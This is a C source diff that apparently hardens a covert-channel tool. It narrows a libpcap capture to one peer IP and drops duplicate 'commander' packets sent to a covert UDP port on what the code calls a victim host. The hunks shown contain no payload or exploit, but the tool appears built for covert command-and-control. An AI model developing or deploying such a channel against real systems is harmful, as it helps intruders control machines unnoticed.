@@ -468,7 +468,7 @@ static int session_open(session_t *session, const char *victim_ip) {
 static int session_open_pcap(session_t *session) {
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program filter;
-    char filter_expr[128];
+    char filter_expr[256];
 
     session->pcap_handle = pcap_open_live("any", 65535, 1, 500, errbuf);
     if (session->pcap_handle == NULL) {
@@ -489,7 +489,8 @@ static int session_open_pcap(session_t *session) {
         return -1;
     }
 
-    snprintf(filter_expr, sizeof(filter_expr), "udp dst port %u", (unsigned)COVERT_PORT);
+    snprintf(filter_expr, sizeof(filter_expr), "udp dst port %u and src host %s",
+             (unsigned)COVERT_PORT, session->peer_ip);
     if (pcap_compile((pcap_t *)session->pcap_handle, &filter, filter_expr, 1, PCAP_NETMASK_UNKNOWN) == 0) {
         (void)pcap_setfilter((pcap_t *)session->pcap_handle, &filter);
         pcap_freecode(&filter);
@@ -639,6 +640,8 @@ static parsed_packet_t g_commander_parsed;
 static uint8_t *g_commander_pkt = NULL;
 static size_t g_commander_pkt_size = 0;
 static int g_commander_pkt_ready = 0;
+static uint32_t g_commander_last_dup_seq = 0;
+static int g_commander_dup_count = 0;
 
 static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
     session_t *session = (session_t *)args;
@@ -681,6 +684,14 @@ static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header,
     ip_header_len = (ip_hdr[0] & 0x0F) * 4;
 
     {
+        struct in_addr src_addr;
+        memcpy(&src_addr, ip_hdr + 12, 4);
+        if (src_addr.s_addr != session->peer_addr.sin_addr.s_addr) {
+            return;
+        }
+    }
+
+    {
         const u_char *udp_hdr = ip_hdr + ip_header_len;
         memcpy(&src_port, udp_hdr, 2);
         memcpy(&dst_port, udp_hdr + 2, 2);
@@ -695,7 +706,13 @@ static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header,
             parsed_packet_t p;
             char e[128];
             if (protocol_parse_packet(g_commander_pkt, payload_sz, &p, e, sizeof(e)) == 0) {
+                if (p.seq_num == g_commander_last_dup_seq && p.command == g_commander_parsed.command) {
+                    g_commander_dup_count++;
+                    return;
+                }
                 g_commander_parsed = p;
+                g_commander_last_dup_seq = p.seq_num;
+                g_commander_dup_count = 0;
                 g_commander_parsed.payload = g_commander_pkt + sizeof(covert_header_t);
                 g_commander_pkt_size = payload_sz;
                 g_commander_pkt_ready = 1;
@@ -714,6 +731,8 @@ static int session_receive_packet(session_t *session, parsed_packet_t *parsed, u
     g_commander_parsed.command = 0;
     g_commander_parsed.payload_len = 0;
     g_commander_parsed.payload = NULL;
+    g_commander_last_dup_seq = 0;
+    g_commander_dup_count = 0;
 
     {
         struct timeval start;
